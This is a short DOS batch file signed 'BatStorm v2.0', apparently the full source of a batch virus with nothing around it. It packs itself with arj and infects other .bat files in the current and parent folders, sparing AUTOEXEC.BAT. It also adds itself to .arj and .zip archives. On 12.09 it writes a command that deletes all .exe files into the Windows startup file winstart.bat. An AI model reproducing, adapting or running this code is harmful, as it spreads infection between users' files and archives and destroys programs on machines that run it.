if $%1==$$ goto s
arj a $.$ $.bat $
copy /b $+$.$ $
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 $ %%b
for %%b in (..\*.bat) do if not %%b==..\AUTOEXEC.BAT call %0 $ %%b
for %%a in (*.arj) do arj a -s1 %%a %f%
for %%z in (*.zip) do pkzip -k %%z %f%
set w=%windir%
if $%w%==$ del $.*
echo.>$
date<$>$.$
find "12.09" $.$
if not errorlevel 1 echo @del *.exe>%w%\winstart.bat
del $.*
:s
if %2==$.BAT goto $
arj l %2
set f=%2
if errorlevel 1 copy /b %2+$ %2
:$ BatStorm v2.0 By JohnGreat 4 Mirochka